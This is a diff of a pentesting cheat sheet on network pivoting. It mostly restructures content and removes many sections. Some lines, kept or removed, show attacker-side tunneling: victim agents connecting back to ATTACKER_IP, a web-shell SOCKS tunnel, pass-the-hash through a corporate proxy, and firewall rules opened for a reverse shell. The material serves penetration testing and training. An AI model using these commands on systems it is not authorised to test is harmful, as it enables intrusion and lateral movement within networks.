@@ -1,35 +1,8 @@
 # Network Pivoting Techniques
 
-## Summary
+## SOCKS Proxy
 
-* [SOCKS Compatibility Table](#socks-compatibility-table)
-* [Windows netsh Port Forwarding](#windows-netsh-port-forwarding)
-* [SSH](#ssh)
-    * [SOCKS Proxy](#socks-proxy)
-    * [Local Port Forwarding](#local-port-forwarding)
-    * [Remote Port Forwarding](#remote-port-forwarding)
-* [Proxychains](#proxychains)
-* [Proxifier](#proxifier)
-* [Graftcp](#graftcp)
-* [Web SOCKS - reGeorg](#web-socks---regeorg)
-* [Web SOCKS - pivotnacci](#web-socks---pivotnacci)
-* [Metasploit](#metasploit)
-* [sshuttle](#sshuttle)
-* [chisel](#chisel)
-    * [SharpChisel](#sharpchisel)
-* [gost](#gost)
-* [Rpivot](#rpivot)
-* [RevSocks](#revsocks)
-* [plink](#plink)
-* [ngrok](#ngrok)
-* [Capture a network trace with builtin tools](#capture-a-network-trace-with-builtin-tools)
-* [Basic Pivoting Types](#basic-pivoting-types)
-    * [Listen - Listen](#listen---listen)
-    * [Listen - Connect](#listen---connect)
-    * [Connect - Connect](#connect---connect)
-* [References](#references)
-
-## SOCKS Compatibility Table
+### SOCKS Compatibility Table
 
 | SOCKS Version | TCP   | UDP   | IPv4  | IPv6  | Hostname |
 | ------------- | :---: | :---: | :---: | :---: | :---:    |
@@ -37,73 +10,29 @@
 | SOCKS v4a     | ✅    | ❌    | ✅    | ❌    | ✅       |
 | SOCKS v5      | ✅    | ✅    | ✅    | ✅    | ✅       |
 
-## Windows netsh Port Forwarding
+### SOCKS Proxy Usage
 
-```powershell
-netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
-netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
+#### Proxychains
 
-# Forward the port 4545 for the reverse shell, and the 80 for the http server for example
-netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
-netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80
-# Correctly open the port on the machine
-netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
-netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
-netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
-netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
+* [rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project.
+* [haad/proxychains](https://github.com/haad/proxychains) - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: "user/pass" for SOCKS4/5, "basic" for HTTP.
 
-```
-
-1. listenaddress – is a local IP address waiting for a connection.
-2. listenport – local listening TCP port (the connection is waited on it).
-3. connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.
-4. connectport – is a TCP port to which the connection from listenport is forwarded to.
-
-## SSH
-
-### SOCKS Proxy
-
-```bash
-ssh -D8080 [user]@[host]
-
-ssh -N -f -D 9000 [user]@[host]
--f : ssh in background
--N : do not execute a remote command
-```
-
-Cool Tip : Konami SSH Port forwarding
-
-```bash
-[ENTER] + [~C]
--D 1090
-```
-
-### Local Port Forwarding
-
-```bash
-ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
-```
-
-### Remote Port Forwarding
-
-```bash
-ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
-ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
-```
-
-## Proxychains
-
-**Config file**: /etc/proxychains.conf
+Edit the **configuration file** `/etc/proxychains.conf` to add the SOCKS proxies.
 
 ```bash
 [ProxyList]
-socks4 localhost 8080
+# socks4 localhost 8080
 socks5 localhost 8081
 ```
 
-Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`
+Uncomment `proxy_dns` to also proxify DNS requests.
 
-## Proxifier
+```ps1
+proxychains nmap -sT 10.10.10.10
+proxychains curl http://10.10.10.10
+```
+
+#### Proxifier
 
 Proxifier allows network applications that do not support working through proxy servers to operate through a SOCKS or HTTPS proxy and chains.
 
@@ -113,7 +42,7 @@ Open Proxifier, go to **Profile** -> **Proxy Servers** and **Add a new proxy ent
 
 Go to **Profile** -> **Proxification Rules**. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule.
 
-## Graftcp
+#### Graftcp
 
 * [hmgle/graftcp](https://github.com/hmgle/graftcp) - A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy.
 
@@ -127,13 +56,12 @@ Go to **Profile** -> **Proxification Rules**. This is where you can add rules th
 
 # Run graftcp and specify the SOCKS5
 (attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
-(attacker) $ graftcp ./nuclei -u http://172.16.1.24
+(attacker) $ graftcp ./nuclei -u http://10.10.10.10
 ```
 
-Simple configuration file for graftcp
+Simple configuration file for graftcp: [example-graftcp-local.conf](https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf)
 
 ```py
-# https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf
 ## Listen address (default ":2233")
 listen = :2233
 loglevel = 1
@@ -147,444 +75,119 @@ socks5 = 127.0.0.1:1080
 select_proxy_mode = auto
 ```
 
-## Web SOCKS - reGeorg
+## Port Forwarding
 
-[reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
+### SSH (native)
 
-Drop one of the following files on the server:
+| Pivoting Technique     | Command |
+| ---------------------- | ------- |
+| Local Port Forwarding  | `ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]` |
+| Remote Port Forwarding | `ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]` |
+| Socks Proxy            | `ssh -N -f -D listenport [user]@[host]` |
 
-* tunnel.ashx
-* tunnel.aspx
-* tunnel.js
-* tunnel.jsp
-* tunnel.nosocket.php
-* tunnel.php
-* tunnel.tomcat.5.jsp
+Inside an already established SSH session, press `~C` to opens an interactive mode to add local (-L), remote (-R), or dynamic (-D) port forwards. `-D` currently cannot be added after connection. Only `-L` or `-R` work reliably. Dynamic forwarding inside an existing session is not supported by OpenSSH.
 
-```python
-python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080
-
-optional arguments:
-  -h, --help           show this help message and exit
-  -l , --listen-on     The default listening address
-  -p , --listen-port   The default listening port
-  -r , --read-buff     Local read buffer, max data to be sent per POST
-  -u , --url           The url containing the tunnel script
-  -v , --verbose       Verbose output[INFO|DEBUG]
+```ps1
+~C
+-L 1080:127.0.0.1:1080
 ```
 
-## Web SOCKS - pivotnacci
-
-[pivotnacci](https://github.com/blackarrowsec/pivotnacci), a tool to make socks connections through HTTP agents.
+### Netsh (native)
 
 ```powershell
-pip3 install pivotnacci
-pivotnacci  https://domain.com/agent.php --password "s3cr3t"
-pivotnacci  https://domain.com/agent.php --polling-interval 2000
+netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
+netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
 ```
-
-## Metasploit
 
 ```powershell
-# Meterpreter list active port forwards
-portfwd list 
-
-# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
-portfwd add –l 3389 –p 3389 –r target-host 
-portfwd add -l 88 -p 88 -r 127.0.0.1
-portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445
-
-# Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
-portfwd delete –l 3389 –p 3389 –r target-host 
-# Meterpreter delete all port forwards
-portfwd flush 
-
-or
-
-# Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
-run autoroute -s 192.168.15.0/24 
-use auxiliary/server/socks_proxy
-set SRVPORT 9090
-set VERSION 4a
-# or
-use auxiliary/server/socks4a     # (deprecated)
-
-
-# Meterpreter list all active routes
-run autoroute -p 
-
-route #Meterpreter view available networks the compromised host can access
-# Meterpreter add route for 192.168.14.0/24 via Session number.
-route add 192.168.14.0 255.255.255.0 3 
-# Meterpreter delete route for 192.168.14.0/24 via Session number.
-route delete 192.168.14.0 255.255.255.0 3 
-# Meterpreter delete all routes
-route flush 
+# Forward the port 4545 for the reverse shell, and the 80 for the http server for example
+netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
+netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80
 ```
-
-## Empire
 
 ```powershell
-(Empire) > socksproxyserver
-(Empire) > use module management/invoke_socksproxy
-(Empire) > set remoteHost 10.10.10.10
-(Empire) > run
+# Correctly open the port on the machine
+netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
+netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
+netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
+netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
 ```
 
-## sshuttle
+1. listenaddress – is a local IP address waiting for a connection.
+2. listenport – local listening TCP port (the connection is waited on it).
+3. connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.
+4. connectport – is a TCP port to which the connection from listenport is forwarded to.
 
-Transparent proxy server that works as a poor man's VPN. Forwards over ssh.
+### Custom Tools
 
-* Doesn't require admin.
-* Works with Linux and MacOS.
-* Supports DNS tunneling.
+* [jpillora/chisel](https://github.com/jpillora/chisel)
+* [ginuerzh/gost](https://github.com/ginuerzh/gost)
 
-```powershell
-pacman -Sy sshuttle
-apt-get install sshuttle
-sshuttle -vvr user@10.10.10.10 10.1.1.0/24
-sshuttle -vvr username@pivot_host 10.2.2.0/24 
+    ```ps1
+    gost -L=tcp://:2222/192.168.1.1:22 [-F=..]
+    ```
 
-# using a private key
-$ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa" 
-
-# -x == exclude some network to not transmit over the tunnel
-# -x x.x.x.x.x/24
-```
-
-## chisel
-
-```powershell
-go get -v github.com/jpillora/chisel
-
-# forward port 389 and 88 to hacker computer
-user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
-user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
-
-# SOCKS
-user@victim$ .\chisel.exe client YOUR_IP:8008 R:socks
-```
-
-### SharpChisel
-
-A C# Wrapper of Chisel : [shantanu561993/SharpChisel](https://github.com/shantanu561993/SharpChisel)
-
-```powershell
-user@hacker$ ./chisel server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"
-================================================================
-server : run the Server Component of chisel 
--p 8080 : run server on port 8080
---key "private": use "private" string to seed the generation of a ECDSA public and private key pair
---auth "user:pass" : Creds required to connect to the server
---reverse:  Allow clients to specify reverse port forwarding remotes in addition to normal remotes.
---proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight.
-
-user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks
-```
-
-## Ligolo
-
-Ligolo : Reverse Tunneling made easy for pentesters, by pentesters
-
-1. Build Ligolo
+* [PuTTY/plink](https://putty.org/index.html)
 
     ```powershell
-    # Get Ligolo and dependencies
-    cd `go env GOPATH`/src
-    git clone https://github.com/sysdream/ligolo
-    cd ligolo
-    make dep
-
-    # Generate self-signed TLS certificates (will be placed in the certs folder)
-    make certs TLS_HOST=example.com
-
-    make build-all
+    plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
+    plink -l root -pw toor -R 445:127.0.0.1:445 
     ```
 
-2. Use Ligolo
+## Network Capture
 
-    ```powershell
-    # On your attack server.
-    ./bin/localrelay_linux_amd64
+### TCPDump
 
-    # On the compromise host.
-    ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
-    ```
+* [the-tcpdump-group/tcpdump](https://github.com/the-tcpdump-group/tcpdump)
 
-## Ligolo-ng
+```ps1
+# capture and save the output inside 0001.pcap
+tcpdump -w 0001.pcap -i eth0
 
-Ligolo-ng : An advanced, yet simple, tunneling tool that uses TUN interfaces.
+# capture and display packet in ASCII
+tcpdump -A -i eth0
 
-### Single Pivot
+# capture every TCP packet on interface eth0
+tcpdump -i eth0 tcp
 
-1. Downloading the binaries from [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.5.2).
+# capture everything on port 22
+tcpdump -i eth0 port 22
+```
 
-2. Setting up the ligolo-ng interface and IP routes.
+### Netsh
 
-    * The initial step is to create a new interface and add an IP route to the subnet that we want to pivot to through this interface. We can easily do it through the following bash script.
-
-        ```bash
-        #!/bin/bash
-        ip tuntap add user root mode tun ligolo
-        ip link set ligolo up
-        ip route add <x.x.x.x\24> dev ligolo
-        ```
-
-    * We can then run the script by issuing the following command
-
-        ```ps1
-        chmod +x ligolo-ng_setup.sh && ./ligolo-ng_setup.sh
-        ```
-
-3. Setting up the ligolo-ng proxy. After the interface has been setup, we can now start the ligolo-ng proxy. We can use any `<PROXY_PORT>` we want as long as it not already in use.
+* Start a capture use the netsh command.
 
     ```ps1
-    ./proxy -laddr <ATTACKER_IP>:<PROXY_PORT> -selfcert
-    ````
-
-4. Using the ligolo-ng agent to connect to the ligolo-ng proxy. In the compromised computer we can use the agent to connect back to the proxy.
-
-    ```ps1
-    ./agent -connect <ATTACKER_IP>:<PROXY_PORT> -ignore-cert
+    netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384
     ```
 
-5. Start tunneling traffic through ligolo-ng. Once the connection from the agent reaches the proxy we can use the `session` command to list the available sessions. We can use the arrow keys to select the session we want and issue the command `start` to start tunnelling traffic through it.
-
-6. Using local tools.
-
-After the tunneling has been initiated, we can use local offensive tools, such as CrackMapExec, Impacket, Nmap through the ligolo-ng network pivot without any kind of limitations or added lag (this is especially true for Nmap).
-
-### Double Pivot
-
-1. Setting up a listener in the initial pivoting session.
-
-    * To start a double pivot, we have to make sure that the connection of the second agent will go through the **first** agent to avoid losing contact to our first pivot. To do so, we will have to create a _listener_ to the ligolo-ng session responsible for the first pivot.
-    * This command starts a listener to all the interfaces (`0.0.0.0`) of the **compromised**  host in port `4443` (we can replace it with any other port we want, as long as it is not already in use in the compromised initial pivot host). Any traffic that reaches this listener will be **redirected to the ligolo-ng** proxy (`--to <ATTACKER_IP>:<PROXY_PORT>`).
-
-        ```ps1
-        listener_add --addr 0.0.0.0:4443 --to <ATTACKER_IP>:<PROXY_PORT> --tcp
-        ```
-
-2. Starting te second agent. After transferring the ligolo-ng agent to the **second** pivot host that we have compromised we will start a connection **not directly to our ligolo-ng proxy** but to the first pivoting agent.
+* Stop the trace
 
     ```ps1
-    .\agent.exe -connect <1st_PIVOT_HOST_IP>:4443 -ignore-cert
+    netsh trace stop
     ```
 
-3. Starting the second pivot. In the ligolo-ng proxy we will receive a call from the second agent through the listener of the first agent. We can use the `session` command and the arrow keys to navigate through the created sessions. Issuing the `start` and `stop` commands we can tell the ligolo-ng proxy which session will be used for tunneling traffic.
-
-4. Adding a new IP route to the second network. Before being able to use our local tools to the second network that we want to pivot to, we need to add a new IP route for it through the `ligolo` interface that we created in the first step.
+* Event tracing
 
     ```ps1
-    ip route add 172.16.10.0/24 dev ligolo
+    netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\trace.etl maxsize=16384
+    etl2pcapng.exe c:\trace.etl c:\trace.pcapng
     ```
 
-5. Using local tools.
+* Use filters
 
-* After the tunneling has been initiated, we can use local offensive tools to the second network as well.
-
-### Triple, etc. Pivot
-
-* The process is exactly the same as the second pivot.
-
-### Pivoting to individual hosts to expose internally running services
-
-* The same process can also be used to pivot to individual hosts instead of whole subnets. This will allow an operator to expose locally running services in the compromised server, similar to the dynamic port forwarding through SSH.
-
-## Gost
-
-> Wiki English : <https://docs.ginuerzh.xyz/gost/en/>
-
-```powershell
-git clone https://github.com/ginuerzh/gost
-cd gost/cmd/gost
-go build
-
-# Socks5 Proxy
-Server side: gost -L=socks5://:1080
-Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true
-
-# Local Port Forward
-gost -L=tcp://:2222/192.168.1.1:22 [-F=..]
-```
-
-## Rpivot
-
-Server (Attacker box)
-
-```python
-python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0
-```
-
-Client (Compromised box)
-
-```python
-python client.py --server-ip <ip> --server-port 9443
-```
-
-Through corporate proxy
-
-```python
-python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
---ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e
-```
-
-Passing the hash
-
-```python
-python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
---ntlm-proxy-port 8080 --domain CORP --username jdoe \
---hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
-```
-
-## revsocks
-
-```powershell
-# Listen on the server and create a SOCKS 5 proxy on port 1080
-user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234
-
-# Connect client to the server
-user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234
-user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"
-```
-
-```powershell
-# Build for Linux
-git clone https://github.com/kost/revsocks
-export GOPATH=~/go
-go get github.com/hashicorp/yamux
-go get github.com/armon/go-socks5
-go get github.com/kost/go-ntlmssp
-go build
-go build -ldflags="-s -w" && upx --brute revsocks
-
-# Build for Windows
-go get github.com/hashicorp/yamux
-go get github.com/armon/go-socks5
-go get github.com/kost/go-ntlmssp
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
-go build -ldflags -H=windowsgui
-upx revsocks
-```
-
-## plink
-
-```powershell
-# exposes the SMB port of the machine in the port 445 of the SSH Server
-plink -l root -pw toor -R 445:127.0.0.1:445 
-# exposes the RDP port of the machine in the port 3390 of the SSH Server
-plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  
-
-plink -l root -pw mypassword 192.168.18.84 -R
-plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445
-
-plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
-# redirects the Windows port 445 to Kali on port 22
-plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   
-```
-
-## ngrok
-
-```powershell
-# get the binary
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-unzip ngrok-stable-linux-amd64.zip 
-
-# log into the service
-./ngrok authtoken 3U[REDACTED_TOKEN]Hm
-
-# deploy a port forwarding for 4433
-./ngrok http 4433
-./ngrok tcp 4433
-```
-
-## cloudflared
-
-```bash
-# Get the binary
-wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
-tar xvzf cloudflared-stable-linux-amd64.tgz
-# Expose accessible internal service to the internet
-./cloudflared tunnel --url <protocol>://<host>:<port>
-```
-
-## Capture a network trace with builtin tools
-
-* Windows (netsh)
-
-  ```ps1
-  # start a capture use the netsh command.
-  netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384
-
-  # stop the trace
-  netsh trace stop
-
-  # Event tracing can be also used across a reboots
-  netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\trace.etl maxsize=16384
-
-  # To open the file in Wireshark you have to convert the etl file to the cap file format. Microsoft has written a convert for this task. Download the latest version.
-  etl2pcapng.exe c:\trace.etl c:\trace.pcapng
-
-  # Use filters
-  netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384
-  ```
-
-* Linux (tcpdump)
-
-  ```ps1
-  sudo apt-get install tcpdump
-  tcpdump -w 0001.pcap -i eth0
-  tcpdump -A -i eth0
-
-  # capture every TCP packet
-  tcpdump -i eth0 tcp
-
-  # capture everything on port 22
-  tcpdump -i eth0 port 22
-  ```
-
-## Basic Pivoting Types
-
-| Type              | Use Case                                    |
-| :-------------    | :------------------------------------------ |
-| Listen - Listen   | Exposed asset, may not want to connect out. |
-| Listen - Connect  | Normal redirect.                            |
-| Connect - Connect | Can’t bind, so connect to bridge two hosts  |
-
-### Listen - Listen
-
-| Type              | Use Case                                    |
-| :-------------    | :------------------------------------------ |
-| ncat              | `ncat -v -l -p 8080 -c "ncat -v -l -p 9090"`|
-| socat             | `socat -v tcp-listen:8080 tcp-listen:9090`  |
-| remote host 1     | `ncat localhost 8080 < file`                |
-| remote host 2     | `ncat localhost 9090 > newfile`             |
-
-### Listen - Connect
-
-| Type              | Use Case                                                        |
-| :-------------    | :------------------------------------------                     |
-| ncat              | `ncat -l -v -p 8080 -c "ncat localhost 9090"`                   |
-| socat             | `socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090` |
-| remote host 1     | `ncat localhost -p 8080 < file`                                 |
-| remote host 2     | `ncat -l -p 9090 > newfile`                                     |
-
-### Connect - Connect
-
-| Type              | Use Case                                                                   |
-| :-------------    | :------------------------------------------                                |
-| ncat              | `ncat localhost 8080 -c "ncat localhost 9090"`                             |
-| socat             | `socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090` |
-| remote host 1     | `ncat -l -p 8080 < file`                                                   |
-| remote host 2     | `ncat -l -p 9090 > newfile`                                                |
+    ```ps1
+    netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384
+    ```
 
 ## References
 
-* [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
-* [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
 * [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
-* [Pivoting Meterpreter](https://www.information-security.fr/pivoting-meterpreter/)
-* 🇫🇷 [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre ZANNI](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/) - 🇺🇸 [Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)
-* [Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8](https://medium.com/@shantanukhande/red-team-using-sharpchisel-to-exfil-internal-network-e1b07ed9b49)
-* [Active Directory - hideandsec](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory)
-* [Windows: Capture a network trace with builtin tools (netsh) - February 22, 2021 Michael Albert](https://michlstechblog.info/blog/windows-capture-a-network-trace-with-builtin-tools-netsh/)
+* [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre ZANNI](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)
+* [GO Simple Tunnel - Documentation](https://gost.run/en/)
+* [Ligolo-ng - Documentation](https://docs.ligolo.ng/)
+* [Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)
+* [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
+* [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin - November 10, 2015](https://web.archive.org/web/20151205120607/https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
+* [Windows: Capture a network trace with builtin tools (netsh) - Michael Albert - February 22, 2021](https://michlstechblog.info/blog/windows-capture-a-network-trace-with-builtin-tools-netsh/)
